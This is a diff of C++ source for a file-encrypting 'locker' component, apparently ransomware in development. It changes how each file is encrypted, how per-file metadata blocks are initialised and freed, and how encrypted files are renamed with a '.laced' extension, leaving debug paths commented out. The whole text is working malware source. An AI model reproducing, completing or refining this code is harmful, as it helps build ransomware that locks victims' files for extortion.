@@ -105,7 +105,6 @@ EncryptAlgoMethod init_hybrid(u32* mode)
 	
 	LOG_ERROR("[GeneratePolicy] Failed; missing crypt/decrypt");
 	return NULL;
-	/*ADD FLAG ERROR*/
 }
 
 bool locker::CryptoSystemInit(CryptoPolicy policy, PCRYPT_INFO crypt_info)
@@ -502,7 +501,8 @@ bool locker::SetOptionFileInfo(PFILE_INFO FileInfo, PDRIVE_INFO data, CRYPT_INFO
 		return false;
 	}
 	
-	memcpy(FileInfo->recent_filename, "C:\\Users\\Clown\\Desktop\\test\\tt\\as1.laced.txt", memory::StrLen(FileInfo->recent_filename));
+	//memcpy(FileInfo->recent_filename, "C:\\Users\\Clown\\Desktop\\test\\tt\\as1.laced.txt", memory::StrLen(FileInfo->recent_filename));
+	//memcpy(FileInfo->recent_filename, "/home/clown/Рабочий стол/LacASD/a/as2.laced.txt", 59);
 	if(GLOBAL_STATE.g_write_in)
 	{
 		FileInfo->recent_filehandle = FileInfo->filehandle;
@@ -514,7 +514,7 @@ bool locker::SetOptionFileInfo(PFILE_INFO FileInfo, PDRIVE_INFO data, CRYPT_INFO
 		return false;
 	}
 
-	if ((FileInfo->hblock = filesystem::init_meta_hblock(FileInfo->filehandle, &FileInfo->filesize, FileInfo->crypt_info->name)) == NULL)
+	if ((FileInfo->hblock = filesystem::init_meta_hblock(FileInfo)) == NULL)
 	{
 		LOG_ERROR("[SetOptionFileInfo] [INIT_MEATA_HBLOCK] Failed; %s", data->Filename);
 		return false;
@@ -527,8 +527,9 @@ bool locker::SetOptionFileInfo(PFILE_INFO FileInfo, PDRIVE_INFO data, CRYPT_INFO
 
 void locker::free_file_info(PFILE_INFO FileInfo, PDRIVE_INFO data, bool success)
 {
-	filesystem::delete_hblock(FileInfo->filehandle, &FileInfo->filesize);
-	filesystem::add_ecrypt_namend(FileInfo->recent_filehandle);
+	//filesystem::delete_hblock(FileInfo->filehandle, &FileInfo->filesize);
+	if(FileInfo->hblock->crypt)
+		filesystem::add_ecrypt_namend(FileInfo);
 	if (FileInfo->filehandle != INVALID_HANDLE_VALUE)
 		api::CloseDesc(FileInfo->filehandle);
 	if (FileInfo->recent_filehandle != INVALID_HANDLE_VALUE)
@@ -545,14 +546,15 @@ void locker::free_file_info(PFILE_INFO FileInfo, PDRIVE_INFO data, bool success)
 
 	memory::m_free(FileInfo->recent_filename);
 	if (FileInfo->crypt_info->gen_policy == GENKEY_EVERY_ONCE && FileInfo->ctx) memory::m_free(FileInfo->ctx);
-	memory::memzero_explicit(FileInfo, sizeof(FILE_INFO));
 	if(success)
 		LOG_SUCCESS("success encrypt file; %s", data->Filename);
 	else
 		LOG_ERROR("failed encrypt file; %s", data->Filename);
 
-	//memory::memzero_free(FileInfo->hblock->pblock, 256);
+	memory::memzero_free(FileInfo->hblock->pblock, 256);
 	memory::memzero_free(FileInfo->hblock->ctx, sizeof(laced_ctx));
+	memory::m_free(FileInfo->hblock);
+	memory::memzero_explicit(FileInfo, sizeof(FILE_INFO));
 	memory::memzero_free(data->Path, memory::StrLen(data->Path));
 	memory::memzero_free(data->Exst, memory::StrLen(data->Exst));
 	memory::memzero_free(data->Filename, memory::StrLen(data->Filename));
